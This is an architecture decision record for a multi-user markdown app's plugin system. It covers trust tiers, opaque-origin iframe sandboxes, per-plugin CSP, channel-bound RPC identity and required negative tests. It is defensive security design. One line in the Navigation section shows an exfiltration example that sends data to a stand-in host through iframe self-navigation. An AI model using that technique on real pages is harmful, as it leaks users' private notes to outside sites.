# ADR-0008: Plugin architecture: two trust tiers, per-plugin isolation, versioned API

- **Status:** Proposed (implementation from v0.4)
- **Date:** 2026-11-09 (revised after design review)

## Context
Third parties must be able to write and publish plugins (an Obsidian-like ecosystem). In a
**multi-user web app**, a plugin that runs in the page with full access amounts to stored XSS
installed on purpose: it runs in other users' browsers with their session. CodeMirror 6
extensions, however, must run in the editor's own JS context.

**Workers are not a sandbox by themselves.** A Worker created by the main page has the app's
origin. It can `fetch('/api/…')` with the user's cookies and open the origin's IndexedDB, and
its CSP is governed by its own script response rather than the page's policy. Isolation must
therefore come from an **opaque origin**, not from "being in a Worker".

## Decision

### Tiers
| Tier | Runs in | Can do | Installed by |
|---|---|---|---|
| **Trusted** | Main window; same-origin ES module served from `/plugins/<id>/<ver>/main.js` with integrity pinning | CM6 extensions, commands, keymaps, markdown syntax, the full `TrustedApp` API (including DOM) | **Instance admin only**; users enable or disable it |
| **Sandboxed** | **One dedicated `<iframe sandbox="allow-scripts">` per plugin** (opaque origin; never `allow-same-origin`). The plugin's Workers are created **inside that iframe**, so they inherit its opaque origin. | Only declared capabilities, through the `SandboxApp` RPC | Any user, for themselves (if the admin allows user installs) |

### Sandboxed isolation contract
- **Origin:** opaque per plugin, so there are no cookies, no access to the app's storage, and no
  access to another plugin's storage. Each plugin gets a namespaced key-value store through RPC
  (`storage:own`), persisted server-side per user and plugin.
- **Network:** each plugin's iframe document is served by the app with **its own CSP**:
  - `default-src 'none'; script-src <app-origin>/plugins/<id>/<ver>/ blob:; connect-src
    <that plugin's declared net: hosts only>; img-src <declared> data: blob:;
    frame-ancestors <app-origin>`;
  - the app origin is written out explicitly because `'self'` doesn't match from an opaque
    origin;
  - workers spawned in the iframe from a `blob:` URL inherit it, and worker script responses
    carry the same CSP header.
  - **There is no combined allowance across plugins.** The main page's `connect-src` never
    includes plugin hosts.
- **Navigation (self-navigation is an exfiltration channel).** `sandbox="allow-scripts"`
  without `allow-top-navigation`, `allow-popups` or `allow-forms` blocks top-level navigation,
  popups and form posts. It does **not** stop a document from navigating **its own iframe**
  (`location = 'https://evil/?d=' + data`). CSP can't stop it either (`navigate-to` was dropped
  from the spec). So:
  - **Headless sandboxed plugins** (the default shape): the iframe document is a
    **host-controlled shim**, and the plugin's code runs **only in a Worker** that the shim
    creates. A Worker can't navigate the iframe and its network access is limited by the CSP,
    so there is no navigation channel. The plugin's UI is declared through a **host-rendered
    component set** (lists, forms, sanitized markdown, tables), sent over RPC.
  - **DOM sandboxed plugins** (the plugin owns the iframe document): they can self-navigate, so
    **any data they can read can leave**. A DOM plugin is user-installable only if it requests
    **no data-reading capability** (`vault:read`, `editor`, or any read of note content).
    Combining DOM UI with a data-reading capability requires **admin approval**, and the
    approval screen states plainly: "this plugin can send the notes it reads to any website".
  - **Detection:** the host treats any iframe `load` after the first as a navigation. It
    closes the channel, removes the iframe, disables the plugin for the session and audit-logs
    the event. This limits repetition; it doesn't undo the first transmission.
- **Caller identity is bound to a channel, never to the message.**
  - For each plugin iframe, the host creates a dedicated `MessageChannel` and keeps port 1.
  - It transfers port 2 into that iframe exactly once, after the iframe's `load` event, using
    `iframe.contentWindow.postMessage(…, '*', [port2])`.
  - The host maps **its own port 1 → (plugin ID, version, approved capabilities, user)**.
  - Every RPC call arrives on a port, and the identity is taken from the port mapping.
  - Any `pluginId` field inside a message is ignored. Messages on `window` (rather than the
    port) are dropped, as are messages with `origin: "null"`.
  - **Invalidation:**
    - on the iframe's navigation (a second `load`), unload, removal, plugin disable or
      revocation, the host closes port 1 and deletes the mapping;
    - a re-load gets a new channel;
    - a sandboxed document that navigates itself loses its capabilities.
- **API access:** the host validates every call against the port's bound capabilities, the
  user's current vault permissions and per-plugin rate limits. Returned data is
  structured-clone only.
- **UI:** the host sizes the iframe; the plugin renders inside its own document. Preview
  renderers return HTML/AST, which the host sanitizes with DOMPurify before insertion.
- **Required negative tests** (CI, per release):
  - undeclared `fetch` is blocked by CSP;
  - `/api` access with cookies fails;
  - reading app or other-plugin IndexedDB fails;
  - calling an undeclared capability returns `EPERM`;
  - a message claiming another plugin's ID gets only the sender's own capabilities;
  - a port is dead after the iframe navigates;
  - `top.location` navigation is blocked;
  - a headless plugin cannot navigate its iframe (it has no document access);
  - a DOM plugin's self-navigation is detected and the plugin is disabled.

### API (`@postelmd/plugin-api`, Apache-2.0)
- Shared base (`App`): plain, **serializable** types (commands, settings, vault read/write by
  capability, events, notifications). Settings are declared as a JSON Schema and rendered by
  the host. Theming uses CSS custom properties.
- `TrustedApp extends App`: adds DOM access (`registerView(el: HTMLElement)`), CM6 extensions
  and keymaps. **Only available in the trusted tier.**
- `SandboxApp = App` over RPC, in two shapes (see *Navigation* above):
  - **headless** (default): code in a Worker; UI only through the host-rendered component set;
  - **DOM**: the plugin draws its own UI inside its iframe document; data-read capabilities
    then require admin approval.
- Lifecycle: `onload(app)` / `onunload()`; every registration returns a `Disposable`.
- **Its own semver** (`apiVersion`): breaking changes only in a major version, with
  deprecations announced at least 2 minor versions or 6 months ahead.

### Manifest
`id`, `version`, `apiVersion`, `minAppVersion`, `tier`, `entry`, `capabilities` (for example
`vault:read`, `vault:write`, `editor`, `ui:panel`, `storage:own`, `net:<host>`),
`settingsSchema`, `integrity`.

### Lifecycle and governance
- **Approval is bound to `(id, version, capabilities hash)`.** An update that adds or changes
  capabilities, or changes tier, requires **renewed admin approval**. It stays on the old
  version until then.
- **Startup failure:** a plugin that throws during `onload` or fails its integrity check is
  disabled for that session and reported to the admin. The app must always boot without
  plugins.
- **Safe mode:** `POSTELMD_PLUGINS=off` (environment variable) or the `?safe-mode` query
  parameter for admins starts with all plugins disabled.
- **Emergency disable:** the admin UI or `postelmd plugin disable <id>` (CLI) work without the
  UI.
- **Revocation:** a signed revocation list is fetched from the registry on startup and every
  24 h. For offline installs it is imported as a file (`postelmd plugin import-revocations`).
  The last known list is cached; revoked plugins are disabled immediately.
- **Distribution:**
  - plugins ship as a bundled artifact; no runtime npm or CDN;
  - the registry is a reviewed git index pointing to signed release artifacts (cosign);
  - offline tarball upload is available for air-gapped installs.
- **Defaults:**
  - **first-party bundled plugins** (Mermaid from v0.4, in the **trusted** tier because it needs
    the DOM; ADR-0007) are **enabled by default**;
  - third-party plugins are never installed or enabled on a fresh instance;
  - user installs are off until the admin allows them.

### Server-side plugins
None in v1 → **signed outbound webhooks** in v1.x → WASM (Extism on wazero) later, with
capability-checked host functions and memory and time limits. All outbound traffic follows the
egress policy (architecture §11).

## Consequences
- Positive: real per-plugin isolation in multi-user installs; the plugin API outlives any UI
  framework choice.
- Negative: one iframe per active sandboxed plugin (memory); building the RPC layer and the
  capability checks is real work; the trusted tier remains a residual risk (threat model).

## Alternatives considered
| Option | Why not |
|---|---|
| Obsidian-style all-trusted plugins | Unacceptable in a multi-user web app: cross-user XSS |
| Workers created by the main page | Same origin as the app: cookies, storage and network all reachable |
| One shared sandbox iframe for all plugins | No per-plugin network or storage isolation |
| ShadowRealm | Not reliably available in browsers |
| Node `vm` server plugins | Not a security boundary |
